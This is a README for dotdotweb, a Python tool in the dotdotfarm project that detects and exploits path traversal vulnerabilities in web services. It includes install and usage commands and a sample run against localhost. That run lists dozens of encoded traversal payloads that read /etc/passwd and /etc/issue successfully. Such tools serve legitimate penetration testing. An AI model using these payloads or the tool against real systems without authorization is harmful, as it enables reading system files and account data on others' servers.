dotdotfarm
==========
Utility for detection & exploitation of Path Traversal vulnerabilities in various network services

dotdotweb - PT tool for web services (HTTP)

Tools are written in Python with using asyncio requests (aiohttp) with some acceleration techniques, which allows you to make **~3K requests per second**

Installation
============
```commandline
git clone https://github.com/treddis/dotdotfarm
cd dotdotfarm
python setup.py
```

Usage
=====
Passing in GET parameters
----------------------
Passing brute parameters via `?par=val` pairs:
```commandline
dotdotweb -o windows "http://someserver.com:1280/newpath?testparameter=FUZZ&secondparameter=somevalue"
```

Example output
==============
```commandline
dotdotweb -o linux "http://localhost:8080/pathtrav?query=FUZZ" 
[*] Started at Mon Jan 16 00:00:44 2023
http://localhost:8080/pathtrav?query=..%2f..%2fetc%2fpasswd                                          [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./%2e./etc/passwd                                  [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/etc/passwd                                        [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2fetc%2fpasswd                                      [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd                        [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./etc/passwd                                       [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../../../etc/passwd                                          [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2fetc%2fpasswd                               [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2f.%2e%2fetc%2fpasswd                        [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/etc/passwd                                       [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd                          [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/etc/passwd                                 [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2fetc%2fpasswd                                  [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2fetc%2fpasswd                                      [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../etc/passwd                                                [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2fetc%2fpasswd                                     [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e./%2e./etc/passwd                                            [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2f..%2fetc%2fpasswd                                [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/.%2e/etc/passwd                                  [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=.%2e/.%2e/etc/passwd                                            [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd                               [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../../etc/passwd                                             [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd                         [Status: 200, Size: 3831]
http://localhost:8080/pathtrav?query=../../../etc/issue                                              [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=../../etc/issue                                                 [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=../../../../etc/issue                                           [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/etc/issue                                  [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/issue                           [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/.%2e/etc/issue                                   [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e/.%2e/etc/issue                                             [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./etc/issue                                        [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e./%2e./etc/issue                                             [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e./%2e./%2e./%2e./etc/issue                                   [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e/.%2e/.%2e/etc/issue                                        [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e/%2e%2e/etc/issue                                         [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2fetc%2fissue                                      [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=..%2f..%2fetc%2fissue                                           [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=..%2f..%2f..%2f..%2fetc%2fissue                                 [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2fetc%2fissue                                       [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2fetc%2fissue                                [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=.%2e%2f.%2e%2f.%2e%2f.%2e%2fetc%2fissue                         [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2fetc%2fissue                                [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2fetc%2fissue                                       [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fissue                         [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2fetc%2fissue                                   [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue                          [Status: 200, Size: 56]
http://localhost:8080/pathtrav?query=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fissue                 [Status: 200, Size: 56]
[*] Ended at Mon Jan 16 00:00:54 2023 (9 seconds)
```
